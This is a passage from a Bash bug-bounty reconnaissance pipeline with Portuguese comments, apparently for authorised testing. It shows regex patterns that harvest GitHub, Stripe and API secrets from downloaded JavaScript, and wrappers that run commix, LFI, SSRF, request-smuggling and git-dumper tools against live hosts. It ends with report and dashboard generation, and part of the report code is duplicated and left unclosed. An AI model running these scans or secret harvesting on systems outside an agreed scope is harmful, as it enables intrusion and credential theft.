        grep -IrohE "ghp_[0-9A-Za-z]{36}" js/downloads/* 2>/dev/null | sort -u > secrets/github_tokens.txt || true
        grep -IrohE "sk_live_[0-9a-zA-Z]{24}" js/downloads/* 2>/dev/null | sort -u > secrets/stripe_keys.txt || true
        grep -IrohE "(api[_-]?key|apikey|access[_-]?token)[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{16,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/generic_api_keys.txt || true
        grep -IrohE "(\?|&)(id|user|search|category|page|item|product|login|admin|auth|token|key|sort|filter)=" urls/with_params.txt > urls/sqli_candidates.txt 2>/dev/null || true

        local AWS_SECRETS=$(safe_count secrets/aws_keys.txt)
        local GOOGLE_SECRETS=$(safe_count secrets/google_api_keys.txt)
        local JWT_SECRETS=$(safe_count secrets/jwt_tokens.txt)
        local GITHUB_SECRETS=$(safe_count secrets/github_tokens.txt)
        local STRIPE_SECRETS=$(safe_count secrets/stripe_keys.txt)
        
        local TOTAL_SECRETS=$((AWS_SECRETS + GOOGLE_SECRETS + JWT_SECRETS + GITHUB_SECRETS + STRIPE_SECRETS))
        
        if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            log_info "⚠️  SECRETS ENCONTRADOS: $TOTAL_SECRETS"
        fi
    else
        log_info "Nenhum arquivo JS encontrado para análise de secrets"
        touch secrets/aws_keys.txt secrets/google_api_keys.txt secrets/jwt_tokens.txt
        TOTAL_SECRETS=0
    fi
}

secrets_hunting

# ============= CLASSIFICAÇÃO GF MELHORADA =============
echo ""
echo "========== GF CLASSIFICATION =========="
send_notification "🔍 *GF CLASSIFICATION*
Classificando URLs por tipo de vulnerabilidade..."

gf_classification() {
    if command -v gf >/dev/null 2>&1 && [[ -s urls/all_urls_raw.txt ]]; then
        log_info "Executando classificação gf contra todas as URLs..."
        
        cat urls/all_urls_raw.txt | gf xss 2>/dev/null | sort -u > urls/gf_xss.txt || true
        cat urls/all_urls_raw.txt | gf sqli 2>/dev/null | sort -u > urls/gf_sqli.txt || true
        cat urls/all_urls_raw.txt | gf lfi 2>/dev/null | sort -u > urls/gf_lfi.txt || true
        cat urls/all_urls_raw.txt | gf ssrf 2>/dev/null | sort -u > urls/gf_ssrf.txt || true
        cat urls/all_urls_raw.txt | gf redirect 2>/dev/null | sort -u > urls/gf_redirect.txt || true
        cat urls/all_urls_raw.txt | gf rce 2>/dev/null | sort -u > urls/gf_rce.txt || true
        
    else
        log_info "gf não disponível ou nenhuma URL para classificar"
        touch urls/gf_xss.txt urls/gf_sqli.txt urls/gf_lfi.txt urls/gf_ssrf.txt urls/gf_redirect.txt urls/gf_rce.txt
    fi
}

gf_classification

XSS_CANDIDATES=$(safe_count urls/gf_xss.txt)
SQLI_CANDIDATES=$(safe_count urls/gf_sqli.txt)
LFI_CANDIDATES=$(safe_count urls/gf_lfi.txt)
SSRF_CANDIDATES=$(safe_count urls/gf_ssrf.txt)

# ============= FASE 6: EXTRA TOOLS EXECUTION =============
echo ""
echo "========== FASE 6: EXTRA TOOLS SCANNING =========="
send_notification "🔧 *FASE 6: EXTRA TOOLS*
Executando ferramentas avançadas de reconhecimento e exploração..."

# ============= FUNÇÃO WRAPPER PARA EXECUÇÃO COM FALLBACK =============
run_tool_safe() {
    local tool_name="$1"
    local tool_command="$2"
    local log_file="logs/extra_tools/${tool_name}.log"
    local error_file="logs/extra_tools/${tool_name}_error.log"
    
    if ! command -v "$tool_name" >/dev/null 2>&1; then
        log_info "⚠️  $tool_name não instalado - pulando..."
        echo "Tool not installed" > "$log_file"
        return 1
    fi
    
    log_info "▶️  Executando $tool_name..."
    
    if eval "$tool_command" > "$log_file" 2> "$error_file"; then
        log_info "✅ $tool_name completo"
        return 0
    else
        log_error "❌ $tool_name falhou - veja $error_file"
        return 1
    fi
}

# ============= KXSS - XSS Detection =============
run_kxss() {
    if [[ ! -s urls/gf_xss.txt ]]; then
        log_info "⚠️  Nenhuma URL XSS candidata encontrada - pulando kxss"
        return 0
    fi
    
    run_tool_safe "kxss" "cat urls/gf_xss.txt | head -100 | kxss | tee reports/kxss/kxss_results.txt"
}

# ============= LINKFINDER - Extract Endpoints from JS =============
run_linkfinder() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo JS baixado - pulando linkfinder"
        return 0
    fi
    
    if command -v linkfinder >/dev/null 2>&1; then
        log_info "▶️  Executando linkfinder em arquivos JS..."
        mkdir -p reports/linkfinder
        
        find js/downloads -type f -name "*.js" | head -50 | while read -r jsfile; do
            safe_name=$(basename "$jsfile" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 30s linkfinder -i "$jsfile" -o cli 2>/dev/null >> reports/linkfinder/endpoints_${safe_name}.txt || true
        done
        
        cat reports/linkfinder/endpoints_*.txt 2>/dev/null | sort -u > reports/linkfinder/all_endpoints.txt || true
        log_info "✅ linkfinder completo"
    fi
}

# ============= PARAMSPIDER - Parameter Discovery =============
run_paramspider() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando paramspider"
        return 0
    fi
    
    if command -v paramspider >/dev/null 2>&1; then
        log_info "▶️  Executando paramspider..."
        mkdir -p reports/paramspider
        
        head -10 alive/hosts_only.txt | while read -r domain; do
            safe_name=$(echo "$domain" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 180s paramspider -d "$domain" --output reports/paramspider/params_${safe_name}.txt 2>/dev/null || true
        done
        
        cat reports/paramspider/params_*.txt 2>/dev/null | sort -u > reports/paramspider/all_params.txt || true
        log_info "✅ paramspider completo"
    fi
}

# ============= ARJUN - Parameter Bruteforce =============
run_arjun() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando arjun"
        return 0
    fi
    
    if command -v arjun >/dev/null 2>&1; then
        log_info "▶️  Executando arjun..."
        mkdir -p reports/arjun
        
        head -5 alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 300s arjun -u "$url" -oJ reports/arjun/params_${safe_name}.json -t "$PARALLEL_HOSTS" 2>/dev/null || true
        done
        
        log_info "✅ arjun completo"
    fi
}

# ============= SECRETFINDER - Find Secrets in JS =============
run_secretfinder() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo JS - pulando secretfinder"
        return 0
    fi
    
    if command -v SecretFinder >/dev/null 2>&1 || command -v secretfinder >/dev/null 2>&1; then
        log_info "▶️  Executando secretfinder..."
        mkdir -p reports/secretfinder
        
        SECRETFINDER_CMD=$(command -v SecretFinder || command -v secretfinder)
        
        find js/downloads -type f -name "*.js" | head -50 | while read -r jsfile; do
            safe_name=$(basename "$jsfile" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 30s python3 "$SECRETFINDER_CMD" -i "$jsfile" -o cli 2>/dev/null >> reports/secretfinder/secrets_${safe_name}.txt || true
        done
        
        cat reports/secretfinder/secrets_*.txt 2>/dev/null | grep -Ei "API|KEY|TOKEN|SECRET|PASSWORD" | sort -u > reports/secretfinder/all_secrets.txt || true
        log_info "✅ secretfinder completo"
    fi
}

# ============= TRUFFLEHOG - Git Secrets Scanner =============
run_trufflehog() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando trufflehog"
        return 0
    fi
    
    if command -v trufflehog >/dev/null 2>&1; then
        log_info "▶️  Executando trufflehog em hosts..."
        mkdir -p reports/trufflehog
        
        head -5 alive/hosts_only.txt | while read -r domain; do
            safe_name=$(echo "$domain" | sed 's/[^a-zA-Z0-9._-]/_/g')
            # Tentar escanear repositório se disponível
            timeout 300s trufflehog https://github.com/${domain} --json > reports/trufflehog/secrets_${safe_name}.json 2>/dev/null || true
        done
        
        log_info "✅ trufflehog completo"
    fi
}

# ============= GITLEAKS - Git Secrets Scanner =============
run_gitleaks() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo para escanear - pulando gitleaks"
        return 0
    fi
    
    if command -v gitleaks >/dev/null 2>&1; then
        log_info "▶️  Executando gitleaks..."
        mkdir -p reports/gitleaks
        
        timeout 300s gitleaks detect --source js/downloads --report-path reports/gitleaks/report.json --no-git 2>/dev/null || true
        log_info "✅ gitleaks completo"
    fi
}

# ============= GIT-DUMPER - Dump Exposed .git =============
run_git_dumper() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando git-dumper"
        return 0
    fi
    
    if command -v git-dumper >/dev/null 2>&1; then
        log_info "▶️  Executando git-dumper..."
        mkdir -p reports/git_dumper
        
        head -5 alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
            git_url="${url}/.git/"
            
            # Verificar se .git está exposto
            if curl -s -m 10 "${git_url}HEAD" | grep -q "ref:"; then
                log_info "🔥 .git exposto encontrado em: $url"
                timeout 300s git-dumper "$git_url" "reports/git_dumper/${safe_name}" 2>/dev/null || true
            fi
        done
        
        log_info "✅ git-dumper completo"
    fi
}

# ============= COMMIX - Command Injection =============
run_commix() {
    if [[ ! -s urls/with_params.txt ]]; then
        log_info "⚠️  Nenhuma URL parametrizada - pulando commix"
        return 0
    fi
    
    if command -v commix >/dev/null 2>&1; then
        log_info "▶️  Executando commix para command injection..."
        mkdir -p reports/commix
        
        head -5 urls/with_params.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 180s commix --url="$url" --batch --output-dir="reports/commix" > reports/commix/commix_${safe_name}.txt 2>&1 || true
        done
        
        log_info "✅ commix completo"
    fi
}

# ============= LFISUITE - LFI Scanner =============
run_lfisuite() {
    if [[ ! -s urls/gf_lfi.txt ]]; then
        log_info "⚠️  Nenhum candidato LFI - pulando lfisuite"
        return 0
    fi
    
    if command -v lfisuite >/dev/null 2>&1; then
        log_info "▶️  Executando lfisuite..."
        mkdir -p reports/lfisuite
        
        head -10 urls/gf_lfi.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 120s lfisuite -u "$url" -o reports/lfisuite/lfi_${safe_name}.txt 2>/dev/null || true
        done
        
        log_info "✅ lfisuite completo"
    fi
}

# ============= SMUGGLER - HTTP Request Smuggling =============
run_smuggler() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando smuggler"
        return 0
    fi
    
    if command -v smuggler >/dev/null 2>&1; then
        log_info "▶️  Executando smuggler para HTTP request smuggling..."
        mkdir -p reports/smuggler
        
        timeout 600s smuggler -u alive/hosts.txt -o reports/smuggler/smuggling_results.txt 2>/dev/null || true
        log_info "✅ smuggler completo"
    fi
}

# ============= SSRFMAP - SSRF Testing =============
run_ssrfmap() {
    if [[ ! -s urls/gf_ssrf.txt ]]; then
        log_info "⚠️  Nenhum candidato SSRF - pulando ssrfmap"
        return 0
    fi
    
    if command -v ssrfmap >/dev/null 2>&1; then
        log_info "▶️  Executando ssrfmap..."
        mkdir -p reports/ssrfmap
        
        head -10 urls/gf_ssrf.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 180s ssrfmap -r "$url" -p payloads --output reports/ssrfmap/ssrf_${safe_name}.txt 2>/dev/null || true
        done
        
        log_info "✅ ssrfmap completo"
    fi
}

# ============= HTTPROBE - Additional HTTP Probing =============
run_httprobe() {
    if [[ ! -s subs/all_subs.txt ]]; then
        log_info "⚠️  Nenhum subdomínio - pulando httprobe"
        return 0
    fi
    
    if command -v httprobe >/dev/null 2>&1; then
        log_info "▶️  Executando httprobe..."
        mkdir -p reports/httprobe
        
        cat subs/all_subs.txt | timeout 600s httprobe -c "$CONCURRENCY" | tee reports/httprobe/live_hosts.txt
        log_info "✅ httprobe completo"
    fi
}

# ============= GOWITNESS - Screenshot Tool =============
run_gowitness() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando gowitness"
        return 0
    fi
    
    if command -v gowitness >/dev/null 2>&1; then
        log_info "▶️  Executando gowitness para screenshots..."
        mkdir -p screenshots/gowitness
        
        timeout 900s gowitness file -f alive/hosts.txt --destination screenshots/gowitness --threads "$PARALLEL_HOSTS" 2>/dev/null || true
        log_info "✅ gowitness completo - screenshots em screenshots/gowitness/"
    fi
}

# ============= AQUATONE - Visual Inspection =============
run_aquatone() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando aquatone"
        return 0
    fi
    
    if command -v aquatone >/dev/null 2>&1; then
        log_info "▶️  Executando aquatone para screenshots..."
        mkdir -p screenshots/aquatone
        
        cat alive/hosts.txt | timeout 900s aquatone -out screenshots/aquatone -threads "$PARALLEL_HOSTS" 2>/dev/null || true
        log_info "✅ aquatone completo - relatório HTML em screenshots/aquatone/"
    fi
}

# ============= S3SCANNER - AWS S3 Bucket Scanner =============
run_s3scanner() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando s3scanner"
        return 0
    fi
    
    if command -v s3scanner >/dev/null 2>&1; then
        log_info "▶️  Executando s3scanner..."
        mkdir -p reports/s3scanner
        
        # Gerar possíveis nomes de buckets a partir dos domínios
        cat alive/hosts_only.txt | sed 's/\./-/g' | head -50 > reports/s3scanner/bucket_names.txt
        
        timeout 600s s3scanner scan -f reports/s3scanner/bucket_names.txt -o reports/s3scanner/buckets_found.txt 2>/dev/null || true
        log_info "✅ s3scanner completo"
    fi
}

# ============= CLOUD_ENUM - Cloud Asset Discovery =============
run_cloud_enum() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando cloud_enum"
        return 0
    fi
    
    if command -v cloud_enum >/dev/null 2>&1; then
        log_info "▶️  Executando cloud_enum..."
        mkdir -p reports/cloud_enum
        
        # Extrair keywords dos domínios
        head -10 alive/hosts_only.txt | sed 's/\.com.*//;s/\..*$//' | sort -u > reports/cloud_enum/keywords.txt
        
        timeout 600s cloud_enum -k reports/cloud_enum/keywords.txt -l reports/cloud_enum/results.txt 2>/dev/null || true
        log_info "✅ cloud_enum completo"
    fi
}

# ============= EXECUÇÃO PARALELA CONTROLADA DAS EXTRA TOOLS =============
run_extra_tools() {
    log_info "🚀 Iniciando execução paralela das EXTRA TOOLS..."
    
    # Executar ferramentas em grupos paralelos baseado no perfil
    local max_parallel=3
    [[ "$PROFILE" = "light" ]] && max_parallel=2
    [[ "$PROFILE" = "aggressive" ]] && max_parallel=5
    
    # Grupo 1: XSS Tools (kxss apenas - gxss removido por instabilidade)
    (run_kxss) &
    wait
    
    # Grupo 2: Link/Endpoint Discovery (linkfinder apenas - xnLinkFinder removido)
    (run_linkfinder) &
    (run_paramspider) &
    wait
    
    # Grupo 3: Parameter Bruteforce - DESABILITADO (contra princípios de bug bounty)
    # run_arjun  # Bruteforce de parâmetros removido - use descoberta passiva
    log_info "⚠️  Arjun parameter bruteforce DESABILITADO (contra princípios de bug bounty)"
    
    # Grupo 4: Secret Scanners (paralelo)
    (run_secretfinder) &
    (run_trufflehog) &
    (run_gitleaks) &
    wait
    
    # Grupo 5: Exploitation Tools (sequencial - invasivo)
    run_git_dumper
    run_commix
    run_lfisuite
    
    # Grupo 6: Advanced Testing (paralelo)
    (run_smuggler) &
    (run_ssrfmap) &
    wait
    
    # Grupo 7: Probing & Screenshots (paralelo)
    (run_httprobe) &
    (run_gowitness) &
    (run_aquatone) &
    wait
    
    # Grupo 8: Cloud Enumeration (paralelo)
    (run_s3scanner) &
    (run_cloud_enum) &
    wait
    
    log_info "✅ Todas as EXTRA TOOLS foram executadas"
}

# Executar EXTRA TOOLS apenas em modo ativo
if [[ "$DRY_RUN" = "false" ]]; then
    run_extra_tools
else
    log_info "DRY-RUN: Pulando EXTRA TOOLS"
fi

# ============= CONTAGEM DE RESULTADOS DAS EXTRA TOOLS =============
KXSS_RESULTS=$(safe_count reports/kxss/kxss_results.txt)
LINKFINDER_ENDPOINTS=$(safe_count reports/linkfinder/all_endpoints.txt)
PARAMSPIDER_PARAMS=$(safe_count reports/paramspider/all_params.txt)
SECRETFINDER_SECRETS=$(safe_count reports/secretfinder/all_secrets.txt)
GOWITNESS_SCREENSHOTS=$(find screenshots/gowitness -name "*.png" 2>/dev/null | wc -l)
AQUATONE_SCREENSHOTS=$(find screenshots/aquatone -name "*.png" 2>/dev/null | wc -l)
S3_BUCKETS=$(safe_count reports/s3scanner/buckets_found.txt)
BURP_VULNS=$(safe_count nuclei/burp_scan/findings_summary.txt)

send_notification "✅ *FASE 6 COMPLETA - EXTRA TOOLS*
🎯 kxss: $KXSS_RESULTS resultados
🔗 linkfinder: $LINKFINDER_ENDPOINTS endpoints
📊 paramspider: $PARAMSPIDER_PARAMS parâmetros
🔑 secretfinder: $SECRETFINDER_SECRETS secrets
📸 gowitness: $GOWITNESS_SCREENSHOTS screenshots
📸 aquatone: $AQUATONE_SCREENSHOTS screenshots
☁️ S3 buckets: $S3_BUCKETS encontrados
🔥 Burp Suite: $BURP_VULNS vulnerabilidades"

# Contar vulnerabilidades para resumo
NUCLEI_FAST_COUNT=$(safe_count nuclei/nuclei_hosts_fast.txt)
NUCLEI_FAST_URLS=$(safe_count nuclei/nuclei_urls_fast.txt)
NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
SQLI_VALIDATED=$(safe_count urls/sqli_validated.txt)

# ADICIONE ESTAS LINHAS AQUI:
TOTAL_SECRETS=$(($(safe_count secrets/aws_keys.txt) + $(safe_count secrets/google_api_keys.txt) + $(safe_count secrets/jwt_tokens.txt) + $(safe_count secrets/github_tokens.txt) + $(safe_count secrets/stripe_keys.txt) + SECRETFINDER_SECRETS))

# Certifique-se que o diretório html existe
mkdir -p html

# Criar resumo de vulnerabilidades
cat > reports/vuln_summary.txt <<-VSUMMARY



# ============= RELATÓRIOS APRIMORADOS =============
echo ""
echo "========== GENERATING ENHANCED REPORTS =========="
send_notification "📊 *GENERATING REPORTS*
Compilando relatórios finais..."

# Contar vulnerabilidades para resumo
NUCLEI_FAST_COUNT=$(safe_count nuclei/nuclei_hosts_fast.txt)
NUCLEI_FAST_URLS=$(safe_count nuclei/nuclei_urls_fast.txt)
NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
SQLI_VALIDATED=$(safe_count urls/sqli_validated.txt)

# Criar resumo de vulnerabilidades
cat > reports/vuln_summary.txt <<-VSUMMARY
VULNERABILITY SUMMARY - $(date -u)
=====================================

🔥 CRITICAL FINDINGS:
- Nuclei Critical: $NUCLEI_FAST_TOTAL  
- SQLi Confirmed: $SQLI_VALIDATED
- Exposed Secrets: $TOTAL_SECRETS (includes secretfinder: $SECRETFINDER_SECRETS)
- XSS Findings: $DALFOX_RESULTS

⚡ POTENTIAL ISSUES:
- XSS Candidates: $XSS_CANDIDATES (kxss: $KXSS_RESULTS)
- SQLi Candidates: $SQLI_CANDIDATES
- LFI Candidates: $LFI_CANDIDATES
- SSRF Candidates: $SSRF_CANDIDATES
- Nuclei Medium: $NUCLEI_EXT_TOTAL

📊 ATTACK SURFACE:
- Live Hosts: $LIVE_HOSTS
- URLs with Params: $PARAM_URLS
- API Endpoints: $API_ENDPOINTS
- JS Files Downloaded: $JS_DOWNLOADED
- New Endpoints (linkfinder): $LINKFINDER_ENDPOINTS
- New Params (paramspider): $PARAMSPIDER_PARAMS

🔧 EXTRA TOOLS RESULTS:
- Screenshots (gowitness): $GOWITNESS_SCREENSHOTS
- Screenshots (aquatone): $AQUATONE_SCREENSHOTS
- S3 Buckets Found: $S3_BUCKETS
- Burp Suite Findings: $BURP_VULNS

PROFILE: $PROFILE
MODE: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (collection only)" || echo "ACTIVE (full scanning)")
PRIORITY: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 HIGH" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 MEDIUM" || echo "🟢 LOW")
VSUMMARY

# Relatório markdown completo
REPORT=reports/report.md

cat > "$REPORT" <<-EOT
# Bug Bounty Reconnaissance Report
Generated: $(date -u)  
Target Scope: $(basename "$SCOPE_FILE")
Profile: **$PROFILE** | Mode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")**

## 🎯 Executive Summary
- **Attack Surface**: $LIVE_HOSTS live hosts, $PARAM_URLS parameterized URLs
- **Risk Level**: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 **HIGH**" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 **MEDIUM**" || echo "🟢 **LOW**")
- **Scan Profile**: $PROFILE (Concurrency: $CONCURRENCY, Rate: $RATE_LIMIT/s)

## 🔥 Critical Vulnerabilities Confirmed

### High-Risk Nuclei Findings
- **Fast Scan**: $NUCLEI_FAST_TOTAL critical findings
- **Details**: See \`nuclei/nuclei_hosts_fast.txt\` and \`nuclei/nuclei_urls_fast.txt\`

### Cross-Site Scripting (XSS)
- **Dalfox Results**: $DALFOX_RESULTS confirmed findings
- **Candidates**: $XSS_CANDIDATES endpoints
- **Details**: See \`nuclei/dalfox_results.txt\` and \`urls/gf_xss.txt\`

### Information Disclosure  
- **Secrets Found**: $TOTAL_SECRETS items
- **AWS Keys**: $(safe_count secrets/aws_keys.txt)
- **Google API**: $(safe_count secrets/google_api_keys.txt)
- **JWT Tokens**: $(safe_count secrets/jwt_tokens.txt)
- **GitHub Tokens**: $(safe_count secrets/github_tokens.txt)
- **Stripe Keys**: $(safe_count secrets/stripe_keys.txt)
- **Location**: \`secrets/\` directory

## ⚡ Potential Vulnerabilities

### SQL Injection
- **Candidates**: $SQLI_CANDIDATES endpoints  
- **Confirmed**: $(safe_count urls/sqli_validated.txt) vulnerabilities
- **Details**: See \`urls/gf_sqli.txt\` and \`poc/sqli/\`
- **Note**: SQLMap testing enabled with safety controls

### Other Vulnerabilities
- **LFI Candidates**: $LFI_CANDIDATES
- **SSRF Candidates**: $SSRF_CANDIDATES
- **RCE Candidates**: $(safe_count urls/gf_rce.txt)

### Misconfigurations
- **Nuclei Extended**: $NUCLEI_EXT_TOTAL findings  
- **Details**: See \`nuclei/nuclei_hosts_ext.txt\`

## 📊 Attack Surface Analysis

### Reconnaissance Results
- **Subdomains Discovered**: $SUBS_FOUND
- **Live Hosts**: $LIVE_HOSTS  
- **Total URLs**: $TOTAL_URLS
- **Parameterized URLs**: $PARAM_URLS
- **JavaScript Files**: $JS_FILES ($JS_DOWNLOADED downloaded)

### API Surface  
- **API Endpoints**: $API_ENDPOINTS
- **Details**: See \`apis/api_endpoints.txt\`

### Port Scanning
- **Open Ports**: $PORTS_FOUND
- **Hosts with Ports**: $HOSTS_WITH_PORTS

### Technology Stack
- **Details**: See \`alive/httpx_parsed.txt\` for full tech stack information

## 🔧 EXTRA TOOLS Results

### XSS Detection
- **kxss Results**: $KXSS_RESULTS findings
- **Reports**: \`reports/kxss/\`

### Endpoint & Link Discovery
- **linkfinder**: $LINKFINDER_ENDPOINTS endpoints extracted from JS
- **paramspider**: $PARAMSPIDER_PARAMS parameters found
- **Reports**: \`reports/linkfinder/\`, \`reports/paramspider/\`

### Burp Suite Scanner
- **Burp Suite Findings**: $BURP_VULNS vulnerabilities detected
- **Reports**: \`nuclei/burp_scan/\` (HTML reports and findings summary)

### Secret Scanning
- **secretfinder**: $SECRETFINDER_SECRETS secrets in JS files
- **gitleaks**: Check \`reports/gitleaks/report.json\`
- **trufflehog**: Check \`reports/trufflehog/\`
- **git-dumper**: Check \`reports/git_dumper/\` for exposed .git

### Visual Reconnaissance
- **gowitness**: $GOWITNESS_SCREENSHOTS screenshots captured
- **aquatone**: $AQUATONE_SCREENSHOTS screenshots + HTML report
- **Location**: \`screenshots/gowitness/\` and \`screenshots/aquatone/\`

### Cloud Assets
- **s3scanner**: $S3_BUCKETS S3 buckets found
- **cloud_enum**: Check \`reports/cloud_enum/results.txt\`

### Advanced Testing
- **commix**: Command injection testing in \`reports/commix/\`
- **lfisuite**: LFI testing in \`reports/lfisuite/\`
- **smuggler**: HTTP smuggling in \`reports/smuggler/\`
- **ssrfmap**: SSRF testing in \`reports/ssrfmap/\`

## 📁 Important Files
- **Live Hosts**: \`alive/httpx_results.txt\`
- **Parameterized URLs**: \`urls/with_params.txt\` 
- **Nuclei Results**: \`nuclei/nuclei_*_fast.txt\` (critical), \`nuclei/nuclei_*_ext.txt\` (extended)
- **XSS Results**: \`nuclei/dalfox_results.txt\`
- **Secrets**: \`secrets/\` directory
- **API Endpoints**: \`apis/api_endpoints.txt\`
- **GF Classification**: \`urls/gf_*.txt\`

## 🚀 Next Steps
1. **Immediate**: Review critical Nuclei findings in \`nuclei/nuclei_*_fast.txt\`
2. **High Priority**: Validate XSS findings from Dalfox
3. **Medium Priority**: Review secrets in \`secrets/\` for sensitive exposure
4. **Validated SQLi**: Check confirmed SQLi in \`urls/sqli_validated.txt\` and \`poc/sqli/\`
5. **Manual Testing**: Additional SQLi candidates in \`urls/gf_sqli.txt\`
6. **Ongoing**: Monitor misconfigurations from extended Nuclei scan

## ⚙️ Configuration Used
- **Profile**: $PROFILE
- **Concurrency**: $CONCURRENCY threads
- **Rate Limit**: $RATE_LIMIT/s
- **Parallel Hosts**: $PARALLEL_HOSTS
- **Timeout**: $TIMEOUT_PER_HOST per host
- **Mode**: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (safe collection only)" || echo "ACTIVE (full vulnerability scanning)")

## ⚠️ Methodology Notes
- Profile-based resource management for safe operation
- DRY-RUN mode enabled by default for safety
- Active scanning requires explicit --confirm flag
- SQLMap testing enabled with level=1, risk=1 safety controls
- All timeouts and rate limits configured per profile
- Scope validation and wildcard handling implemented
- Manual verification required before reporting findings

## 🔧 Tool Coverage
**Subdomain Enumeration**: subfinder, amass, findomain, chaos, crt.sh
**Live Detection**: httpx with tech detection, httprobe
**Port Scanning**: naabu$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**URL Collection**: gau, waybackurls, hakrawler, katana, gospider
**Vulnerability Scanning**: nuclei, dalfox, burp suite scanner$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**Classification**: gf patterns
**Secrets**: regex-based JS analysis, secretfinder, trufflehog, gitleaks
**XSS Detection**: kxss, dalfox
**Endpoint Discovery**: linkfinder, paramspider, arjun
**Exploitation**: commix, lfisuite, smuggler, ssrfmap
**Visual Recon**: gowitness, aquatone
**Cloud Assets**: s3scanner, cloud_enum
**Git Exposure**: git-dumper

---
**Report generated by enhanced reconnaissance pipeline with profile-based controls**
**Command used**: $0 $([ "$DRY_RUN" = "true" ] && echo "--dry-run" || echo "--confirm") --profile=$PROFILE $SCOPE_FILE
EOT

# Criar dashboard HTML melhorado
HTML=html/dashboard.html
mkdir -p "$(dirname "$HTML")"
cat > "$HTML" <<-HTMLDOC

<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Enhanced Recon Dashboard</title>
  <style>
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;padding:20px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0}
    .container{max-width:1400px;margin:0 auto;background:white;padding:30px;border-radius:15px;box-shadow:0 8px 32px rgba(0,0,0,0.1)}
    .header{text-align:center;margin-bottom:30px;padding:20px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);border-radius:10px;color:white}
    .metric{display:inline-block;margin:10px;padding:20px;background:#f8f9fa;border-radius:12px;min-width:140px;text-align:center;border:2px solid transparent;transition:all 0.3s ease}
    .metric:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.1)}
    .metric-value{font-size:28px;font-weight:bold;color:#2563eb}
    .metric-label{font-size:12px;color:#6b7280;margin-top:8px;font-weight:500}
    .critical{background:linear-gradient(135deg,#fef2f2,#fee2e2);border-color:#ef4444;color:#dc2626}
    .critical .metric-value{color:#dc2626}
    .warning{background:linear-gradient(135deg,#fefce8,#fef3c7);border-color:#f59e0b;color:#d97706}
    .warning .metric-value{color:#d97706}
    .success{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border-color:#10b981;color:#059669}
    .success .metric-value{color:#059669}
    .profile-badge{display:inline-block;padding:8px 16px;background:#6366f1;color:white;border-radius:20px;font-size:14px;font-weight:bold;margin:10px}
    pre{background:#f4f4f4;padding:15px;border-radius:8px;overflow-x:auto;border-left:4px solid #6366f1}
    h1{color:#1f2937;margin-bottom:10px;font-size:2.5rem}
    h2{color:#374151;margin-top:40px;margin-bottom:20px;font-size:1.5rem;border-bottom:2px solid #e5e7eb;padding-bottom:10px}
    .status{text-align:center;padding:15px;border-radius:10px;margin:20px 0;font-weight:bold}
    .dry-run{background:#fef3c7;color:#92400e;border:2px solid #f59e0b}
